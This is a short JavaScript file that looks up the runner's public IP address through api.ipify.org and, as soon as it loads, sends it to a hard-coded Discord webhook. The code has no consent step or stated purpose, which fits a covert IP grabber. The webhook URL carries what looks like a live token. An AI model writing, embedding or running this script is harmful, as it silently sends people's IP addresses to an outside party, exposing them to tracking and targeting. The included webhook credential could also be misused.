
const ipifyAPI = "https://api.ipify.org?format=json";


const webhookURL = "https://discordapp.com/api/webhooks/1375041712010952816/mc2cFMieatOYeud90IAhkcFBbb6oOWt9xerq4lIFBTIwDcjykLnY6591rBQLp1lZ5Y2S";


async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) {
        console.error("IP address is null or undefined.");
        return;
    }

    const payload = {
        content: `IP Address: ${ip}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("IP sent to Discord successfully!");
        } else {
            console.error("Error sending IP to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}


async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}


main();
